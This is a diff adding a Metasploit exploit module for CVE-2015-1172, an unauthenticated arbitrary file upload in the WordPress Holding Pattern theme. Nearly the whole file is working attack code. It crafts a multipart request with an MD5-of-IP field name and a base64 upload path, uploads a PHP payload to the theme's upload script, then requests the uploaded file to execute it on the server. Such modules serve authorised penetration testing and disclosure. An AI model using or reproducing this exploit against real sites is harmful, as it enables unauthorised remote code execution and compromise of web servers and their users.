@@ -1,0 +1,98 @@
+##
+# This module requires Metasploit: http://www.metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'msf/core'
+require 'socket'
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::FileDropper
+  include Msf::Exploit::Remote::HTTP::Wordpress
+
+  def initialize(info = {})
+    super(update_info(
+      info,
+      'Name'            => 'WordPress Holding Pattern Theme Arbitrary File Upload',
+      'Description'     => %q{
+          This module exploits a file upload vulnerability in all versions of the
+          Holding Pattern theme found in the upload_file.php script which contains
+          no session or file validation. It allows unauthenticated users to upload
+          files of any type and subsequently execute PHP scripts in the context of
+          the web server.
+        },
+      'License'         => MSF_LICENSE,
+      'Author'          =>
+        [
+          'Alexander Borg',                 # Vulnerability disclosure
+          'Rob Carr <rob[at]rastating.com>' # Metasploit module
+        ],
+      'References'      =>
+        [
+          ['CVE', '2015-1172'],
+          ['WPVDB', '7784'],
+          ['PACKETSTORM', '130282']
+        ],
+      'DisclosureDate'  => 'Feb 11 2015',
+      'Platform'        => 'php',
+      'Arch'            => ARCH_PHP,
+      'Targets'         => [['holding_pattern', {}]],
+      'DefaultTarget'   => 0
+    ))
+  end
+
+  def check
+    check_theme_version_from_readme('holding_pattern')
+  end
+
+  def rhost
+    datastore['RHOST']
+  end
+
+  def holding_pattern_uploads_url
+    normalize_uri(wordpress_url_themes, 'holding_pattern', 'uploads/')
+  end
+
+  def holding_pattern_uploader_url
+    normalize_uri(wordpress_url_themes, 'holding_pattern', 'admin', 'upload-file.php')
+  end
+
+  def generate_mime_message(payload, payload_name)
+    data = Rex::MIME::Message.new
+    target_ip = IPSocket.getaddress(rhost)
+    field_name = Rex::Text.md5(target_ip)
+
+    # In versions 1.2 and 1.3 of the theme, the upload directory must
+    # be encoded in base64 and sent with the request. To maintain
+    # compatibility with the hardcoded path of ../uploads in prior
+    # versions, we will send the same path in the request.
+    upload_path = Rex::Text.encode_base64('../uploads')
+
+    data.add_part(payload.encoded, 'application/x-php', nil, "form-data; name=\"#{field_name}\"; filename=\"#{payload_name}\"")
+    data.add_part(upload_path, nil, nil, 'form-data; name="upload_path"')
+    data
+  end
+
+  def exploit
+    print_status("Preparing payload...")
+    payload_name = "#{Rex::Text.rand_text_alpha_lower(10)}.php"
+    data = generate_mime_message(payload, payload_name)
+
+    print_status("Uploading payload...")
+    res = send_request_cgi(
+      'method'    => 'POST',
+      'uri'       => holding_pattern_uploader_url,
+      'ctype'     => "multipart/form-data; boundary=#{data.bound}",
+      'data'      => data.to_s
+    )
+    fail_with(Failure::Unreachable, 'No response from the target') if res.nil?
+    fail_with(Failure::UnexpectedReply, "Server responded with status code #{res.code}") if res.code != 200
+    payload_url = normalize_uri(holding_pattern_uploads_url, payload_name)
+
+    print_status("Executing the payload at #{payload_url}")
+    register_files_for_cleanup(payload_name)
+    send_request_cgi({ 'uri' => payload_url, 'method'  => 'GET' }, 5)
+  end
+end
